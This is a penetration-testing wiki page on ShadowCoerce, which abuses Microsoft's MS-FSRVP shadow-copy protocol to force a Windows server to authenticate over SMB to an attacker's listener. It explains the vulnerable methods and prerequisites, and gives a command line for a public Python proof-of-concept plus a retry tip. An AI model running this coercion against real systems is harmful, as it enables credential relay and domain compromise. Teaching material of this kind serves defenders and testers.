# MS-FSRVP abuse (ShadowCoerce)

## Theory

MS-FSRVP is Microsoft's File Server Remote VSS Protocol. It's used for creating shadow copies of file shares on a remote computer, and for facilitating backup applications in performing application-consistent backup and restore of data on SMB2 shares ([docs.microsoft.com](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)).

In late 2021, [Lionel GILLES](https://twitter.com/topotam77) published [slides](https://twitter.com/topotam77/status/1475701014204461056) showcasing [PetitPotam](ms-efsr.md) and demonstrating the possibility of abusing the protocol to coerce authentications on the last two slides.

Similarly to other MS-RPC abuses, this works by using a specific method relying on remote UNC paths. In this case, at the time of writing, two methods were detected as vulnerable: `IsPathSupported` and `IsPathShadowCopied`.

**The coerced authentications are made over SMB**. Unlike other similar coercion methods (MS-RPRN printerbug, MS-EFSR petitpotam), I doubt MS-FSRVP abuse can be combined with [WebClient abuse](webclient.md) to elicit incoming authentications made over HTTP. <mark style="color:orange;">This is just a theory at the time of writing, 29th December 2021, I haven't tested it yet.</mark>

A requirement to the abuse is to have the "File Server VSS Agent Service" enabled on the target server.

![](<../../../.gitbook/assets/File Server VSS Agent Service.png>)

## Practice

The following Python proof-of-concept ([https://github.com/ShutdownRepo/ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)) implements the `IsPathSupported` and `IsPathShadowCopied` methods.

```bash
shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
```

![](<../../../.gitbook/assets/MS FSRVP abuse example.png>)

{% hint style="info" %}
In my tests, the coercion needed to be attempted twice in order to work when the FssAgent hadn't been requested in a while. In short, run the command again if it doesn't work the first time.
{% endhint %}

## Resources

Topotam's tweet: [https://twitter.com/topotam77/status/1475701014204461056](https://twitter.com/topotam77/status/1475701014204461056)

Topotam's slides: [https://fr.slideshare.net/LionelTopotam/petit-potam-slidesrtfmossir](https://fr.slideshare.net/LionelTopotam/petit-potam-slidesrtfmossir)

{% file src="../../../.gitbook/assets/PetitPotam-SLIDES-RTFM_OSSIR.pdf" %}

{% embed url="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b" %}
